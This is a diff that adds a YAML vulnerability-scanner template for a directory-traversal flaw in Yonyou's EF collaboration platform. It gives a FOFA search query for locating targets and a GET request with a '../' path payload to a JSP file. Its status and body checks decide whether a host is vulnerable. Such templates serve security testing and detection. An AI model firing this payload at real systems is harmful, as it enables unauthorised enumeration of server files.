@@ -1,0 +1,25 @@
+info:
+  vulId: yonyou_ef_fileread
+  detail: 用友EF协作平台目录遍历漏洞
+  fofaQuery: title="天擎"
+rules:
+  - request:
+      path: "{{rootUrl}}/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+      dataType: text
+      data: ""
+    checksCondition: and
+    checks:
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
+
+      - checkType: string
+        desireds:
+          - 200
+        place: body
+        condition: and
